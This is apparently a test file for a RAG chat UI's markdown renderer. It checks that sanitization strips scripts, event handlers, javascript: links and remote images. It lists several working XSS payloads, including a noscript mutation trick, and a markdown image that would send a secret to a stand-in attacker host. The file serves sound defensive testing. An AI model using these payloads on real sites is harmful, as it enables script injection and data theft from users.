// Copyright (C) 2024-2026 Intel Corporation
// SPDX-License-Identifier: Apache-2.0

// @vitest-environment jsdom

import { parseMarkdown } from "@intel-enterprise-rag-ui/markdown";
import { describe, expect, it } from "vitest";

const render = (markdown: string) => {
  const container = document.createElement("div");
  container.innerHTML = parseMarkdown(markdown);
  return container;
};

const expectNoActiveContent = (container: HTMLElement) => {
  expect(
    container.querySelector("script, iframe, object, embed, img, style"),
  ).toBeNull();
  for (const el of container.querySelectorAll("*")) {
    for (const attr of el.attributes) {
      expect(attr.name.startsWith("on")).toBe(false);
      expect(attr.value).not.toMatch(/^\s*javascript:/i);
    }
  }
};

describe("parseMarkdown sanitization", () => {
  it.each([
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<details open ontoggle=alert(1)>x</details>",
    '<iframe src="javascript:alert(1)"></iframe>',
    '<a href="javascript:alert(1)">x</a>',
    "[x](javascript:alert(1))",
    '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
    "text with inline <img src=x onerror=alert(1)> html",
  ])("neutralises %s", (payload) => {
    expectNoActiveContent(render(payload));
  });

  it("renders raw HTML as visible text, not elements", () => {
    const container = render('<b>bold</b> and <div class="x">block</div>');
    expect(container.querySelector("b")).toBeNull();
    expect(container.querySelector("div.x")).toBeNull();
    expect(container.textContent).toContain("<b>bold</b>");
    expect(container.textContent).toContain('<div class="x">block</div>');
  });

  it("does not render remote images", () => {
    const container = render("![leak](https://attacker.example/?q=secret)");
    expect(container.querySelector("img")).toBeNull();
    const link = container.querySelector("a");
    expect(link?.getAttribute("href")).toBe(
      "https://attacker.example/?q=secret",
    );
    expect(link?.getAttribute("rel")).toBe("noopener noreferrer");
  });

  it("strips style and id attributes", () => {
    const container = render(
      '<p style="position:fixed" id="clobber">x</p>\n\n[link](https://example.com)',
    );
    expect(container.querySelector("[style], [id]")).toBeNull();
  });

  it.each([
    ["", "f(X) -> X.\ng(Y) <- Y."],
    ["cpp", "#include <vector>\nint main() { return 0; }"],
    ["php", "<?php echo 1; ?>"],
    ["html", '<div class="a">&amp; <script>x</script></div>'],
  ])("keeps %s code verbatim", (lang, code) => {
    const container = render(`\`\`\`${lang}\n${code}\n\`\`\``);
    expect(container.querySelector("pre > code")?.textContent).toBe(code);
  });

  it("keeps inline code verbatim", () => {
    const container = render("Use `a -> b` and `<vector>`.");
    const codes = [...container.querySelectorAll("code")].map(
      (el) => el.textContent,
    );
    expect(codes).toEqual(["a -> b", "<vector>"]);
  });

  it("keeps the renderer's own copy button, icon and task-list checkbox", () => {
    const container = render("```js\nconst a = 1;\n```\n\n- [x] done");
    const button = container.querySelector("button[data-markdown-copy]");
    expect(button).not.toBeNull();
    expect(button?.querySelector("svg rect, svg path")).not.toBeNull();
    expect(container.querySelector('input[type="checkbox"]')).not.toBeNull();
  });
});
